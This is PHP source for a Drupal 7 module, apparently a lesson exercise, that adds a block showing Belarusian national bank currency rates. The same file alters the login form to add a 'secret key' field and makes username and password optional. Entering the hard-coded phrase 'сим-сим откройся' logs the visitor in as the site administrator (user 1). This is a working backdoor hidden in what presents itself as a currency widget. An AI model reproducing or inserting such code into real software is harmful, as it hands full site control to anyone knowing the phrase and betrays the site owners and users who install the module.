<?php
/**
 * @file
 * Module file for lesson_block.
 */

/**
 * Implements hook_block_info().
 */
function lesson_block_block_info() {
  $blocks['currency_rates'] = [
    'info' => t('Currency Rates of NBRB'),
    'cache' => DRUPAL_CACHE_GLOBAL,
  ];

  return $blocks;
}

/**
 * Implements hook_block_configure().
 */
function lesson_block_block_configure($delta = '') {
  if ($delta == 'currency_rates') {
    $currency_rates = lesson_block_get_currency_rates();
    foreach ($currency_rates as $currency) {
      $id = $currency['Cur_ID'];
      $currencies[$id] = $currency['Cur_Name'];
    }
    $default = variable_get('currencies_options', []);
    $form['currencies_options'] = [
      '#title' => t('Choose Currencies'),
      '#type' => 'checkboxes',
      '#description' => t('Please note that only choosen currencies will be shown.'),
      '#options' => $currencies,
      '#default_value' => $default,
    ];

    return system_settings_form($form);
  }
}

/**
 * Implements hook_block_save().
 */
function lesson_block_block_save($delta = '', $edit = []) {
  if ($delta == 'currency_rates') {
    variable_set('currencies_options', $edit['currencies_options']);
  }
}

/**
 * Implements hook_block_view().
 */
function lesson_block_block_view($delta = '') {
  $when_updated = date('Y-m-d H:i:s');
  $block['subject'] = t('Currency Rates of NBRB, updated !when_updated', ['!when_updated' => $when_updated]);
  $block['content'] = lesson_block_contents();

  return $block;
}

/**
 * Implements hook_cron().
 */
function lesson_block_cron() {
  global $theme_key;
  cache_clear_all('lesson_block:currency_rates:' . $theme_key, 'cache_block');
}

/**
 * Implements hook_form_FORM_ID_alter().
 */
function lesson_block_form_user_login_block_alter(&$form, &$form_state, $form_id) {
  $form['secret_key'] = [
    '#type' => 'textfield',
    '#title' => t('Your Secret Key'),
    '#size' => 15,
    '#maxlength' => 20,
  ];
  $form['name']['#required'] = FALSE;
  $form['pass']['#required'] = FALSE;
  $form['#validate'][] = 'lesson_block_check_if_secret_key_is_entered';
}

/**
 * Implements hook_theme().
 */
function lesson_block_theme() {
  $items['user_login_block'] = [
    'render element' => 'form',
    'template' => 'templates/user_login',
    'preprocess functions' => ['lesson_block_preprocess_user_login'],
  ];

  return $items;
}

/**
 * Preprocess function to build login form
 */
function lesson_block_preprocess_user_login(&$vars) {
  $args = func_get_args();
  array_shift($args);
  $form_state['build_info']['args'] = $args;
  $vars['form'] = drupal_build_form('user_login_block', $form_state['build_info']['args']);
}

/**
 * Checks if user entered secret key and checks if it is correct.
 */
function lesson_block_check_if_secret_key_is_entered($form, &$form_state) {
  if (isset($form_state['values']['secret_key']) && $form_state['values']['secret_key'] == 'сим-сим откройся') {
    form_clear_error();
    drupal_get_messages();
    if ($admin_user = user_load(1)) {
      global $user;
      $user->uid = 1;
      $user->name = $admin_user->name;
      $user->timezone = $admin_user->timezone;
      $form_state['uid'] = $user->uid;
      user_login_finalize($form_state);
    }
  }
}

/**
 * Renders block content.
 */
function lesson_block_contents() {
  $currencies_to_show = variable_get('currencies_options', []);
  $currency_rates = lesson_block_get_currency_rates();

  foreach ($currency_rates as $k => $v) {
    if ($currencies_to_show[$v['Cur_ID']] !== 0) {
      $currencies[] = $v['Cur_Name'] . '-' . $v['Cur_OfficialRate'];
    }
  }

  return theme('item_list', $variables = [
    'items' =>  $currencies,
    'type' => 'ul',
  ]);
}

/**
 * Sends request to fetch currency rates.
 */
function lesson_block_get_currency_rates() {
  $endpoint = 'http://www.nbrb.by/API/ExRates/Rates?Periodicity=0';
  $request = drupal_http_request($endpoint);
  $result = $request->data;
  $result = json_decode($result, TRUE);

  return $result;
}
